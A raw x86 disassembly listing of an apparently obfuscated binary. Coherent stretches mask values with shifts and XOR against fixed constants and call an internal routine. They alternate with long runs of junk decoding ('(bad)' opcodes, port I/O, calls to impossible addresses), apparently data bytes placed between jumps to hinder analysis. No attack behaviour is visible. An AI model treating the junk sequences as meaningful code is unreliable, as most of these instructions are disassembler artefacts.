  407d1d:	or     BYTE PTR [eax+0x7ae7d35b],0x30
  407d24:	in     al,0x17
  407d26:	xor    bl,ch
  407d28:	xchg   edi,eax
  407d29:	div    BYTE PTR ds:0x826b4c11
  407d2f:	add    edi,ebx
  407d31:	or     bh,dh
  407d33:	nop
  407d34:	push   ebp
  407d35:	das    
  407d36:	xchg   edx,eax
  407d37:	xchg   ebx,eax
  407d38:	out    dx,al
  407d39:	pop    ds
  407d3a:	(bad)  
  407d3b:	call   0x93ab77fd
  407d40:	fmul   QWORD PTR [ebx-0x490d5923]
  407d46:	ss cvtpi2ps xmm6,mm5
  407d4a:	inc    ebp
  407d4b:	mov    edx,0x1bc6220b
  407d50:	std    
  407d51:	xor    al,0xa0
  407d53:	cmp    eax,0x44811770
  407d58:	push   ebp
  407d59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d5a:	(bad)  
  407d5b:	xor    esi,ecx
  407d5d:	fcomp  st(5)
  407d5f:	test   al,0x5c
  407d61:	(bad)  
  407d62:	fmul   QWORD PTR [ebx-0x567baeb0]
  407d68:	sub    DWORD PTR [eax],esp
  407d6a:	xlat   BYTE PTR ds:[ebx]
  407d6b:	fwait
  407d6c:	rcl    BYTE PTR [ebp+0x5c4ec63c],1
  407d72:	inc    eax
  407d73:	ds retf 0x62c6
  407d77:	out    0x50,eax
  407d79:	cmp    cl,BYTE PTR [esi-0xa]
  407d7c:	adc    BYTE PTR [edi-0x391b810c],dl
  407d82:	jl     0x407d6d
  407d84:	add    ah,BYTE PTR [edi]
  407d86:	outs   dx,BYTE PTR ds:[esi]
  407d87:	leave  
  407d88:	ret    
  407d89:	in     al,dx
  407d8a:	fidivr DWORD PTR [ebx-0x2b]
  407d8d:	retf   
  407d8e:	sub    ecx,DWORD PTR [ebx]
  407d90:	xor    ah,al
  407d92:	or     DWORD PTR [edx],edx
  407d94:	jg     0x407d36
  407d96:	lahf   
  407d97:	dec    ebx
  407d98:	fist   WORD PTR [ebx*2-0x38812464]
  407d9f:	call   0x1ee4da03
  407da4:	cmp    DWORD PTR [edi-0x1d],0xd0108d89
  407dab:	mov    ebx,0x9eb8d1fa
  407db0:	sub    BYTE PTR [ebx-0x6e],bl
  407db3:	jg     0x407d71
  407db5:	or     DWORD PTR [esi],esi
  407db7:	xor    al,0x44
  407db9:	xchg   esi,eax
  407dba:	sti    
  407dbb:	fcomp  QWORD PTR [edx-0x18]
  407dbe:	jg     0x407dfc
  407dc0:	out    dx,eax
  407dc1:	dec    eax
  407dc2:	and    dh,BYTE PTR [ecx-0x68dca803]
  407dc8:	push   ecx
  407dc9:	xchg   ecx,eax
  407dca:	push   cs
  407dcb:	pop    esp
  407dcc:	mov    ?,WORD PTR [ecx+0x678d4f51]
  407dd2:	mov    eax,ds:0x68cb1f53
  407dd7:	jmp    0x978595ca
  407ddc:	lods   eax,DWORD PTR ds:[esi]
  407ddd:	xor    al,0x79
  407ddf:	aaa    
  407de0:	rol    DWORD PTR [ecx-0x59b3de49],0xae
  407de7:	(bad)
  407dea:	jge    0x407dd0
  407dec:	xor    al,0x1c
  407dee:	add    eax,0x890dca82
  407df3:	cs aaa 
  407df5:	fisubr DWORD PTR [ecx+edx*8-0x34]
  407df9:	pop    ecx
  407dfa:	and    BYTE PTR [ebp+0x26],dl
  407dfd:	dec    esi
  407dfe:	(bad)  
  407dff:	not    cl
  407e01:	inc    ebx
  407e02:	in     al,dx
  407e03:	stos   BYTE PTR es:[edi],al
  407e04:	or     ch,dh
  407e06:	cmp    cl,BYTE PTR [esi+eiz*4-0x28445158]
  407e0d:	inc    eax
  407e0e:	mov    ecx,DWORD PTR [ebp+0xc]
  407e11:	shrd   eax,ecx,0x2
  407e15:	shr    ecx,0x2
  407e18:	mov    ecx,DWORD PTR [ebp+0x8]
  407e1b:	mov    edx,DWORD PTR [ebp+0xc]
  407e1e:	xor    eax,edi
  407e20:	shl    ecx,0x1e
  407e23:	xor    edx,edx
  407e25:	or     eax,edx
  407e27:	add    eax,DWORD PTR ds:0x4226e8
  407e2d:	mov    DWORD PTR [ebp+0x14],eax
  407e30:	mov    eax,DWORD PTR [ebp+0x8]
  407e33:	mov    ecx,DWORD PTR [ebp+0xc]
  407e36:	shrd   eax,ecx,0x2
  407e3a:	shr    ecx,0x2
  407e3d:	mov    ecx,DWORD PTR [ebp+0x8]
  407e40:	mov    edx,DWORD PTR [ebp+0xc]
  407e43:	xor    eax,edi
  407e45:	shl    ecx,0x1e
  407e48:	xor    edx,edx
  407e4a:	or     eax,edx
  407e4c:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  407e50:	mov    eax,DWORD PTR [ebp+0x14]
  407e53:	xor    BYTE PTR [eax],cl
  407e55:	mov    eax,DWORD PTR [ebp-0x60]
  407e58:	mov    ecx,DWORD PTR [ebp-0x5c]
  407e5b:	shrd   eax,ecx,0x2
  407e5f:	shr    ecx,0x2
  407e62:	mov    ecx,DWORD PTR [ebp-0x60]
  407e65:	mov    edx,DWORD PTR [ebp-0x5c]
  407e68:	xor    eax,edi
  407e6a:	shl    ecx,0x1e
  407e6d:	xor    edx,edx
  407e6f:	or     eax,edx
  407e71:	add    eax,DWORD PTR ds:0x4226e8
  407e77:	mov    DWORD PTR [ebp+0x14],eax
  407e7a:	mov    eax,DWORD PTR [ebp-0x60]
  407e7d:	mov    ecx,DWORD PTR [ebp-0x5c]
  407e80:	shrd   eax,ecx,0x2
  407e84:	shr    ecx,0x2
  407e87:	mov    ecx,DWORD PTR [ebp-0x60]
  407e8a:	mov    edx,DWORD PTR [ebp-0x5c]
  407e8d:	xor    eax,edi
  407e8f:	shl    ecx,0x1e
  407e92:	xor    edx,edx
  407e94:	or     eax,edx
  407e96:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  407e9a:	mov    eax,DWORD PTR [ebp+0x14]
  407e9d:	or     BYTE PTR [eax],cl
  407e9f:	mov    eax,DWORD PTR [ebp-0x48]
  407ea2:	mov    ecx,DWORD PTR [ebp-0x44]
  407ea5:	shrd   eax,ecx,0x2
  407ea9:	shr    ecx,0x2
  407eac:	mov    ecx,DWORD PTR [ebp-0x48]
  407eaf:	mov    edx,DWORD PTR [ebp-0x44]
  407eb2:	xor    eax,edi
  407eb4:	jmp    0x408255
  407eb9:	out    0x23,al
  407ebb:	pop    ss
  407ebc:	jns    0x407ed9
  407ebe:	jns    0x407e6b
  407ec0:	mov    bl,0xaa
  407ec2:	repz ror edi,0xbf
  407ec6:	adc    dl,BYTE PTR [edx]
  407ec8:	sahf   
  407ec9:	mov    esi,0xbdbebe65
  407ece:	les    edi,FWORD PTR [esi+0x162710be]
  407ed4:	mov    edx,DWORD PTR [esi]
  407ed6:	mov    bl,0xff
  407ed8:	in     al,0x69
  407eda:	mov    bl,0x24
  407edc:	bound  ecx,QWORD PTR [eax+0x37]
  407edf:	mov    eax,ds:0xc72a67b4
  407ee4:	sub    eax,edx
  407ee6:	hlt    
  407ee7:	sti    
  407ee8:	cmp    al,0xac
  407eea:	cs push ebp
  407eec:	call   0xbf42c9b3
  407ef1:	dec    edx
  407ef2:	adc    al,0x2b
  407ef4:	sar    BYTE PTR [esi+eiz*8-0x129c9a31],0x32
  407efc:	cdq    
  407efd:	in     al,0xf0
  407eff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f00:	or     BYTE PTR [esi-0x6f],0x6d
  407f04:	cmp    BYTE PTR [ecx],dl
  407f06:	add    DWORD PTR [esi-0x71],eax
  407f09:	addr16 or bl,dl
  407f0c:	push   es
  407f0d:	repz das 
  407f0f:	cmp    ah,dh
  407f11:	jecxz  0x407eb6
  407f13:	xchg   DWORD PTR [edi],ebp
  407f15:	xor    eax,0x82dd8252
  407f1a:	call   0x12516371
  407f1f:	ret    
  407f20:	ja     0x407ece
  407f22:	mov    ch,0x35
  407f24:	and    DWORD PTR cs:[eax+0xc2a47b6],ebp
  407f2b:	retf   
  407f2c:	adc    eax,0x89b664d
  407f31:	xchg   edx,eax
  407f32:	inc    edi
  407f33:	lock pushf 
  407f35:	jo     0x407f42
  407f37:	enter  0x5981,0xb3
  407f3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f3c:	jns    0x407f81
  407f3e:	mov    ecx,0x2907ff27
  407f43:	add    ah,BYTE PTR [eax-0x3a]
  407f46:	int    0xa1
  407f48:	jmp    0x5b6b49c2
  407f4d:	scas   al,BYTE PTR es:[edi]
  407f4e:	aam    0xf7
  407f50:	int    0xdd
  407f52:	or     ecx,DWORD PTR [esi+esi*2+0x4b]
  407f56:	and    al,0x37
  407f58:	mov    eax,DWORD PTR ds:0x293d06bc
  407f5e:	shl    BYTE PTR [esi],1
  407f60:	add    DWORD PTR [ebx-0x67eed383],edx
  407f66:	das    
  407f67:	dec    ebx
  407f68:	add    ecx,DWORD PTR [ecx]
  407f6a:	jle    0x407fe5
  407f6c:	int    0xb6
  407f6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f6f:	(bad)  
  407f70:	dec    ebp
  407f71:	jno    0x407fc4
  407f73:	inc    edx
  407f74:	sahf   
  407f75:	shl    ebp,1
  407f77:	pop    esi
  407f78:	fwait
  407f79:	in     al,dx
  407f7a:	push   edi
  407f7b:	into   
  407f7c:	inc    edi
  407f7d:	shr    dh,0x43
  407f80:	dec    edi
  407f81:	retf   
  407f82:	lods   eax,DWORD PTR ds:[esi]
  407f83:	cmp    ah,ah
  407f85:	sbb    ecx,DWORD PTR [ebp-0x9]
  407f88:	sbb    DWORD PTR [ebx+0x24],0xffffffe0
  407f8c:	jae    0x407ff1
  407f8e:	mov    edi,DWORD PTR [ecx+0x5d02879f]
  407f94:	(bad)  
  407f95:	jle    0x407f9a
  407f97:	mov    ds:0xd5939541,al
  407f9c:	fiadd  WORD PTR [edi+0x385e73a8]
  407fa2:	mov    esi,0x332b29df
  407fa7:	jle    0x407fe7
  407fa9:	dec    edx
  407faa:	neg    BYTE PTR [ebp+ecx*1-0x15]
  407fae:	xchg   esp,eax
  407faf:	cmp    al,0x5c
  407fb1:	loop   0x407f3a
  407fb3:	stos   BYTE PTR es:[edi],al
  407fb4:	sub    edx,DWORD PTR [eax+0x7ad8b43b]
  407fba:	xlat   BYTE PTR ds:[ebx]
  407fbb:	mov    ecx,0x4614095
  407fc0:	test   al,0xd5
  407fc2:	sub    al,0xf0
  407fc4:	out    dx,eax
  407fc5:	lahf   
  407fc6:	inc    esi
  407fc7:	add    ebp,edx
  407fc9:	popa   
  407fca:	mov    ecx,0xb2b175bb
  407fcf:	xor    al,0x96
  407fd1:	mov    esp,0x788b8d66
  407fd6:	jns    0x40803c
  407fd8:	loope  0x408016
  407fda:	mov    bl,0xf8
  407fdc:	pop    ebp
  407fdd:	fsubr  DWORD PTR [ecx]
  407fdf:	push   ebx
  407fe0:	dec    esp
  407fe1:	clc    
  407fe2:	div    BYTE PTR [eax+0x67]
  407fe5:	lods   al,BYTE PTR ds:[esi]
  407fe6:	(bad)  
  407fe7:	dec    edx
  407fe8:	xchg   ecx,eax
  407fe9:	sub    BYTE PTR [eax+0x57],dl
  407fec:	fnstenv [eax]
  407fee:	fsubr  DWORD PTR [eax]
  407ff0:	and    dl,BYTE PTR [eax-0xe]
  407ff3:	jmp    0xb7cbf812
  407ff8:	dec    edi
  407ff9:	sbb    dl,BYTE PTR [eax-0x51fecf1c]
  407fff:	retf   0x45f1
  408002:	inc    ecx
  408003:	and    ch,dh
  408005:	inc    ebx
  408006:	(bad)  
  408007:	int    0x83
  408009:	(bad)  
  40800a:	mov    bh,BYTE PTR [ebx]
  40800c:	jle    0x407f94
  40800e:	cmp    esp,DWORD PTR [eax-0x9868c63]
  408014:	pop    ss
  408015:	outs   dx,BYTE PTR ds:[esi]
  408016:	adc    ecx,DWORD PTR [eax-0x82fd98c]
  40801c:	sbb    cl,dh
  40801e:	push   es
  40801f:	jmp    0x407fe9
  408021:	push   ebp
  408022:	mov    WORD PTR [ebx+esi*2+0x63],es
  408026:	and    al,0x43
  408028:	in     al,dx
  408029:	icebp  
  40802a:	mov    cl,0xfd
  40802c:	pop    ebp
  40802e:	jecxz  0x407fc3
  408030:	mov    ds:0x9b5f6240,eax
  408035:	in     al,0xd4
  408037:	mov    DWORD PTR [ebp+0x6232f35f],esp
  40803d:	nop
  40803e:	retf   0xde92
  408041:	xchg   ebx,eax
  408042:	jne    0x407fcb
  408044:	in     al,0x33
  408046:	cmp    eax,0xaa96976
  40804b:	(bad)  ds:0x5bc6ea9f
  408051:	mul    BYTE PTR [eax+0x760a456a]
  408057:	sub    al,0xb0
  408059:	aas    
  40805a:	mov    esp,DWORD PTR [ecx-0x3e6705d5]
  408060:	les    edx,FWORD PTR [ebx+0x45]
  408063:	into   
  408064:	mov    al,ds:0x8ffb06f3
  408069:	lods   al,BYTE PTR ds:[esi]
  40806a:	jecxz  0x408001
  40806c:	sub    BYTE PTR [esi-0x2c],0xcf
  408070:	mov    ah,0xb7
  408072:	das    
  408073:	in     al,0x2d
  408075:	ds test eax,0x831e4d2b
  40807b:	pop    eax
  40807c:	xchg   esp,eax
  40807d:	mov    bl,0x17
  40807f:	pop    edi
  408080:	adc    al,0x54
  408082:	inc    esi
  408083:	add    eax,DWORD PTR [esi]
  408085:	push   cs
  408086:	aaa    
  408087:	xchg   esi,eax
  408088:	pop    ds
  408089:	(bad)  
  40808a:	cmovns eax,DWORD PTR [ecx+esi*8+0x55f0fb29]
  408092:	mov    dl,0xc2
  408094:	pusha  
  408095:	inc    ebx
  408096:	imul   esp,DWORD PTR [esi],0x8f3dfdfa
  40809c:	jno    0x40808d
  40809e:	pop    DWORD PTR [ecx+0x1d]
  4080a1:	cld    
  4080a2:	xchg   ebp,eax
  4080a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4080a4:	movq   mm0,QWORD PTR [edi+eiz*8+0x5a]
  4080a9:	hlt    
  4080aa:	dec    edx
  4080ab:	pusha  
  4080ac:	aaa    
  4080ad:	sbb    al,BYTE PTR [edi+ecx*2-0x7f29161]
  4080b4:	out    0xfb,al
  4080b6:	inc    ebx
  4080b7:	xchg   edi,eax
  4080b8:	lock ror BYTE PTR [esi+0x24314597],1
  4080bf:	sub    al,0xbf
  4080c1:	hlt    
  4080c2:	cmp    BYTE PTR [ebx+esi*4],cl
  4080c5:	or     DWORD PTR [ecx+0x69],edx
  4080c8:	xor    edi,DWORD PTR [edx+0x9ab541c]
  4080ce:	cmp    eax,0xa988c11b
  4080d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4080d4:	xchg   edi,eax
  4080d5:	cmp    al,0xfc
  4080d7:	dec    ecx
  4080d8:	aas    
  4080d9:	int3   
  4080da:	inc    edx
  4080db:	lahf   
  4080dc:	(bad)  
  4080dd:	adc    al,0x3
  4080df:	cwde   
  4080e0:	(bad)  
  4080e1:	jecxz  0x408118
  4080e3:	ins    BYTE PTR es:[edi],dx
  4080e4:	cmove  edi,DWORD PTR [esi]
  4080e7:	pop    edx
  4080e8:	fs ins DWORD PTR es:[edi],dx
  4080ea:	in     eax,dx
  4080eb:	shr    ch,0xd7
  4080ee:	outs   dx,BYTE PTR ds:[esi]
  4080ef:	aam    0xa
  4080f1:	fiadd  WORD PTR [ebp+0x116acf30]
  4080f7:	xchg   edi,eax
  4080f8:	les    eax,FWORD PTR ds:0xf0be9598
  4080fe:	stc    
  4080ff:	mov    esi,0xd7d27da4
  408104:	jne    0x40815f
  408106:	sub    DWORD PTR [edx-0x23],edx
  408109:	(bad)  
  40810a:	je     0x408184
  40810c:	or     al,0xb7
  40810e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40810f:	call   0xbb53:0xa4f1afe
  408116:	mov    ds:0xa94356c5,eax
  40811b:	(bad)  
  40811c:	pop    ecx
  40811d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40811e:	mov    ebp,0xa751416b
  408123:	pop    esi
  408124:	add    al,0xb4
  408126:	imul   edx,DWORD PTR [ecx],0x52
  408129:	and    eax,0x69ac5cfd
  40812e:	inc    ebx
  40812f:	push   esi
  408130:	rcl    BYTE PTR [ecx+0x28d52c6d],0xd2
  408137:	adc    eax,0x5a5cf71e
  40813c:	sbb    eax,0x8ab088c4
  408141:	rol    edi,1
  408143:	rcr    BYTE PTR [ebp-0x5f0f955d],0xd
  40814a:	xchg   ebp,eax
  40814b:	pop    ss
  40814c:	add    ebp,DWORD PTR [edi+ebx*8-0x56]
  408150:	aam    0xc8
  408152:	fs mov ebx,0x97797f35
  408158:	les    eax,FWORD PTR [esi+0x4b]
  40815b:	scas   eax,DWORD PTR es:[edi]
  40815c:	jo     0x408100
  40815e:	out    0xbf,al
  408160:	mov    WORD PTR [edx+ebx*8],ss
  408163:	out    0x2b,eax
  408165:	retf   
  408166:	mul    BYTE PTR ss:[edi]
  408169:	jge    0x408157
  40816b:	je     0x408199
  40816d:	in     al,dx
  40816e:	or     BYTE PTR [eax],bl
  408170:	(bad)  
  408172:	test   DWORD PTR [ebp-0x3f],ebp
  408175:	jl     0x408150
  408177:	ins    BYTE PTR es:[edi],dx
  408178:	std    
  408179:	and    ch,BYTE PTR [edi+0x695bedcc]
  40817f:	sub    bh,BYTE PTR es:0x827fe23c
  408186:	or     al,0x49
  408188:	ret    
  408189:	inc    esp
  40818a:	cs js  0x4081b2
  40818d:	test   BYTE PTR [esi-0x1cdc0c8d],0xc5
  408194:	pop    esp
  408195:	jnp    0x40812d
  408197:	pop    ss
  408198:	retf   0xe3c7
  40819b:	sbb    DWORD PTR [esi+0x7a0649b7],esp
  4081a1:	mov    eax,0x99df035e
  4081a6:	xchg   ecx,eax
  4081a7:	mov    cl,0x2
  4081a9:	cmp    eax,0x10179d45
  4081ae:	push   ecx
  4081af:	fidivr WORD PTR [ecx]
  4081b1:	jp     0x4081f5
  4081b3:	push   ebp
  4081b4:	add    eax,0x1d92fd2f
  4081b9:	inc    edi
  4081ba:	jg     0x4081c6
  4081bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081bd:	vrsqrtss xmm3,xmm6,DWORD PTR [esp+ebp*4]
  4081c2:	and    eax,0xe51c5155
  4081c7:	sub    DWORD PTR [ebx+0x6],esi
  4081ca:	ins    BYTE PTR es:[edi],dx
  4081cb:	push   0x754362d1
  4081d0:	loopne 0x4081e7
  4081d2:	int    0xee
  4081d4:	idiv   DWORD PTR [edi+0x5c86db2c]
  4081da:	iret   
  4081db:	cmp    edi,esi
  4081dd:	and    edi,DWORD PTR [edx]
  4081df:	dec    ecx
  4081e0:	or     BYTE PTR [edx+0x21],0x82
  4081e4:	mov    esp,0xee3ab154
  4081e9:	xor    esp,DWORD PTR [esi-0x7]
  4081ec:	dec    esi
  4081ed:	jl     0x40826a
  4081ef:	es push esp
  4081f1:	sbb    al,0xcf
  4081f3:	push   cs
  4081f4:	xchg   esp,eax
  4081f5:	pop    ds
  4081f6:	stc    
  4081f7:	mov    al,ds:0xc939a2bf
  4081fc:	out    0x25,eax
  4081fe:	add    BYTE PTR [edi],dl
  408200:	mov    cs,WORD PTR [ecx+esi*4]
  408203:	push   ebp
  408204:	mov    edi,0x99e8ddcb
  408209:	mov    edi,0x9b300030
  40820e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40820f:	rol    bh,cl
  408211:	xchg   esi,eax
  408212:	stos   BYTE PTR es:[edi],al
  408213:	stos   DWORD PTR es:[edi],eax
  408214:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408215:	and    DWORD PTR [esp+ecx*1],ebx
  408218:	lea    ecx,ds:0x7ce434db
  40821e:	inc    edx
  40821f:	push   es
  408220:	pop    ecx
  408221:	nop
  408222:	pop    ecx
  408223:	enter  0xfa7,0x92
  408227:	push   esp
  408228:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408229:	push   ss
  40822a:	(bad)  [esp+edi*8-0xb9706a2]
  408231:	cmp    BYTE PTR [ebp-0x540cd5a7],al
  408237:	cmp    eax,0x847b2259
  40823c:	aam    0xdb
  40823e:	js     0x4081d3
  408240:	(bad)  
  408241:	jmp    0x408260
  408243:	fimul  WORD PTR [edx+0x4d]
  408246:	jno    0x4081c9
  408248:	out    0x26,al
  40824a:	pop    eax
  40824b:	sub    ecx,eax
  40824d:	adc    esi,eax
  40824f:	sbb    BYTE PTR [esi-0x37],0xf1
  408253:	ins    DWORD PTR es:[edi],dx
  408254:	jae    0x408289
  408256:	ror    BYTE PTR [ebx],cl
  408258:	ret    0x503
  40825b:	call   0xc140c486
  408260:	loope  0x408280
  408262:	mov    DWORD PTR [ebp+0x14],eax
  408265:	mov    eax,DWORD PTR [ebp-0x48]
  408268:	mov    ecx,DWORD PTR [ebp-0x44]
  40826b:	shrd   eax,ecx,0x2
  40826f:	shr    ecx,0x2
  408272:	mov    ecx,DWORD PTR [ebp-0x48]
  408275:	mov    edx,DWORD PTR [ebp-0x44]
  408278:	xor    eax,edi
  40827a:	shl    ecx,0x1e
  40827d:	xor    edx,edx
  40827f:	or     eax,edx
  408281:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  408285:	mov    eax,DWORD PTR [ebp+0x14]
  408288:	add    BYTE PTR [eax],cl
  40828a:	mov    eax,DWORD PTR [ebp-0x38]
  40828d:	mov    ecx,DWORD PTR [ebp-0x34]
  408290:	shrd   eax,ecx,0x2
  408294:	xor    eax,edi
  408296:	shr    ecx,0x2
  408299:	mov    ecx,DWORD PTR [ebp-0x38]
  40829c:	mov    edx,DWORD PTR [ebp-0x34]
  40829f:	shl    ecx,0x1e
  4082a2:	mov    ecx,DWORD PTR [ebp-0x38]
  4082a5:	xor    edx,edx
  4082a7:	or     eax,edx
  4082a9:	mov    edx,DWORD PTR [ebp-0x34]
  4082ac:	add    eax,DWORD PTR ds:0x4226e8
  4082b2:	shrd   ecx,edx,0x2
  4082b6:	xor    ecx,edi
  4082b8:	shr    edx,0x2
  4082bb:	mov    edx,DWORD PTR [ebp-0x38]
  4082be:	mov    edi,DWORD PTR [ebp-0x34]
  4082c1:	xor    edi,edi
  4082c3:	or     ecx,edi
  4082c5:	mov    cl,BYTE PTR [ebp+ecx*1-0x4]
  4082c9:	or     BYTE PTR [eax],cl
  4082cb:	mov    eax,DWORD PTR [esi]
  4082cd:	mov    ecx,DWORD PTR [esi+0x4]
  4082d0:	shl    eax,0x1e
  4082d3:	shl    edx,0x1e
  4082d6:	mov    edx,DWORD PTR [esi]
  4082d8:	mov    edi,DWORD PTR [esi+0x4]
  4082db:	xor    edi,0x9c2b8ae8
  4082e1:	xor    eax,0x80000000
  4082e6:	mov    DWORD PTR [ebp+0x14],eax
  4082e9:	mov    eax,0xcb79b577
  4082ee:	xor    edx,eax
  4082f0:	shrd   edx,edi,0x2
  4082f4:	shr    edi,0x2
  4082f7:	or     edi,DWORD PTR [ebp+0x14]
  4082fa:	xor    ecx,ecx
  4082fc:	or     edx,ecx
  4082fe:	mov    ecx,DWORD PTR [ebx]
  408300:	mov    DWORD PTR [ebp-0x64],edi
  408303:	mov    edi,DWORD PTR [ebx+0x4]
  408306:	mov    edi,ecx
  408308:	xor    ecx,ecx
  40830a:	shl    edi,0x1e
  40830d:	xor    edi,0x80000000
  408313:	mov    DWORD PTR [ebp+0x10],ecx
  408316:	mov    ecx,DWORD PTR [ebx]
  408318:	mov    DWORD PTR [ebp+0x14],edi
  40831b:	mov    edi,DWORD PTR [ebx+0x4]
  40831e:	xor    ecx,eax
  408320:	xor    edi,0x9c2b8ae8
  408326:	shrd   ecx,edi,0x2
  40832a:	or     ecx,DWORD PTR [ebp+0x10]
  40832d:	shr    edi,0x2
  408330:	mov    DWORD PTR [ebp-0x70],ecx
  408333:	mov    ecx,edi
  408335:	or     ecx,DWORD PTR [ebp+0x14]
  408338:	mov    DWORD PTR [ebp+0xc],edi
  40833b:	cmp    edx,DWORD PTR [ebp-0x70]
  40833e:	jne    0x408bb3
  408344:	cmp    DWORD PTR [ebp-0x64],ecx
  408347:	jne    0x408bb3
  40834d:	jmp    0x4083eb
  408352:	mov    eax,DWORD PTR [esi]
  408354:	mov    edx,DWORD PTR [esi+0x4]
  408357:	mov    eax,DWORD PTR [esi]
  408359:	mov    edx,DWORD PTR [esi+0x4]
  40835c:	mov    edx,eax
  40835e:	xor    eax,eax
  408360:	shl    edx,0x1e
  408363:	mov    DWORD PTR [ebp+0x10],eax
  408366:	mov    eax,DWORD PTR [esi]
  408368:	xor    edx,0x80000000
  40836e:	mov    DWORD PTR [ebp+0x14],edx
  408371:	mov    edx,DWORD PTR [esi+0x4]
  408374:	xor    eax,0xcb79b577
  408379:	xor    ecx,edx
  40837b:	shrd   eax,ecx,0x2
  40837f:	or     eax,DWORD PTR [ebp+0x10]
  408382:	shr    ecx,0x2
  408385:	mov    DWORD PTR [ebp+0x8],eax
  408388:	mov    eax,ecx
  40838a:	or     eax,DWORD PTR [ebp+0x14]
  40838d:	mov    ecx,DWORD PTR [ebx]
  40838f:	mov    edx,DWORD PTR [ebx+0x4]
  408392:	push   eax
  408393:	push   DWORD PTR [ebp+0x8]
  408396:	push   edx
  408397:	push   ecx
  408398:	call   0x41594e
  40839d:	mov    eax,DWORD PTR [esi]
  40839f:	mov    ecx,DWORD PTR [esi+0x4]
  4083a2:	shrd   eax,ecx,0x2
  4083a6:	shr    ecx,0x2
  4083a9:	shr    edx,0x1e
  4083ac:	xor    ecx,0xe70ae2ba
  4083b2:	push   ecx
  4083b3:	xor    eax,edi
  4083b5:	mov    DWORD PTR [ebp+0x10],edx
  4083b8:	mov    edx,DWORD PTR [ebx]
  4083ba:	mov    edi,DWORD PTR [ebx+0x4]
  4083bd:	push   eax
  4083be:	push   edi
  4083bf:	push   edx
  4083c0:	call   0x41594e
  4083c5:	shld   edx,eax,0x2
  4083c9:	shl    eax,0x2
  4083cc:	mov    ecx,eax
  4083ce:	or     ecx,DWORD PTR [ebp+0x10]
  4083d1:	xor    eax,eax
  4083d3:	or     edx,eax
  4083d5:	xor    ecx,0xcb79b576
  4083db:	xor    edx,0x9c2b8ae8
  4083e1:	mov    DWORD PTR [esi],ecx
  4083e3:	mov    DWORD PTR [esi+0x4],edx
  4083e6:	mov    eax,0xcb79b577
  4083eb:	mov    ecx,DWORD PTR [esi]
  4083ed:	mov    edx,DWORD PTR [esi+0x4]
  4083f0:	mov    edx,ecx
  4083f2:	shl    edx,0x1e
  4083f5:	xor    edx,0x80000000
  4083fb:	mov    DWORD PTR [ebp+0x14],edx
  4083fe:	mov    edx,DWORD PTR [esi]
  408400:	mov    edi,DWORD PTR [esi+0x4]
  408403:	xor    edi,0x9c2b8ae8
  408409:	xor    edx,eax
  40840b:	shrd   edx,edi,0x2
  40840f:	shr    edi,0x2
  408412:	or     edi,DWORD PTR [ebp+0x14]
  408415:	xor    ecx,ecx
  408417:	or     edx,ecx
  408419:	mov    ecx,DWORD PTR [ebx]
  40841b:	mov    DWORD PTR [ebp+0xc],edi
  40841e:	mov    edi,DWORD PTR [ebx+0x4]
  408421:	mov    edi,ecx
  408423:	xor    ecx,ecx
  408425:	shl    edi,0x1e
  408428:	mov    DWORD PTR [ebp+0x10],ecx
  40842b:	mov    ecx,DWORD PTR [ebx]
  40842d:	xor    edi,0x80000000
  408433:	mov    DWORD PTR [ebp+0x14],edi
  408436:	mov    edi,DWORD PTR [ebx+0x4]
  408439:	xor    eax,ecx
  40843b:	jmp    0x4087dc
  408440:	xor    eax,0x7b36559b
  408445:	cmp    al,0xb6
  408447:	pushf  
  408448:	pop    eax
  408449:	out    dx,eax
  40844a:	push   0xffffffd1
  40844c:	push   ds
  40844d:	jp     0x40840b
  40844f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408450:	mov    ebp,0xbdbebe6b
  408455:	les    edi,FWORD PTR [esi-0x4f776842]
  40845b:	xchg   ecx,eax
  40845c:	(bad)  
  40845e:	jecxz  0x40846b
  408460:	inc    ebx
  408461:	inc    esi
  408462:	mov    ch,bl
  408464:	xor    ch,BYTE PTR [ecx]
  408466:	out    0x71,eax
  408468:	or     ecx,eax
  40846a:	sbb    BYTE PTR [eax+0x117aaf89],ah
  408470:	(bad)  
  408471:	lea    edi,[edi+0x794ee113]
  408477:	enter  0x2e3,0xad
  40847b:	test   al,0x3d
  40847d:	mov    al,ds:0x1cd0e15d
  408482:	mov    ah,0x66
  408484:	jmp    0x40843a
  408486:	push   esi
  408487:	mov    al,0xd9
  408489:	xor    ah,BYTE PTR [esi-0x598930a4]
  40848f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408490:	sbb    DWORD PTR [edi+0x46418328],edx
  408496:	adc    eax,0x285f0c79
  40849b:	jmp    0xd22ca74a
  4084a0:	xchg   edx,eax
  4084a1:	in     eax,dx
  4084a2:	xchg   BYTE PTR [edi-0x6d0174d6],al
  4084a8:	out    dx,eax
  4084a9:	push   0x6e
  4084ab:	push   esi
  4084ac:	jge    0x40848a
  4084ae:	sub    eax,0xfe6c7b66
  4084b3:	add    eax,0x395e286
  4084b8:	fwait
  4084b9:	sub    eax,0xdaa22383
  4084be:	addr16 push ss
  4084c0:	push   ds
  4084c1:	push   fs
  4084c3:	and    eax,0x523744cc
  4084c8:	in     eax,0xa9
  4084ca:	jl     0x4084fe
  4084cc:	aaa    
  4084cd:	les    ebx,FWORD PTR [edx+0x79]
  4084d0:	pop    edx
  4084d1:	iret   
  4084d2:	popa   
  4084d3:	inc    ecx
  4084d4:	addr16 pop edi
  4084d6:	rol    BYTE PTR [eax+0x39],0x34
  4084da:	popf   
  4084db:	push   ecx
  4084dc:	mov    al,0xc9
  4084de:	xor    eax,0x71cdbfb0
  4084e3:	or     ax,0x2686
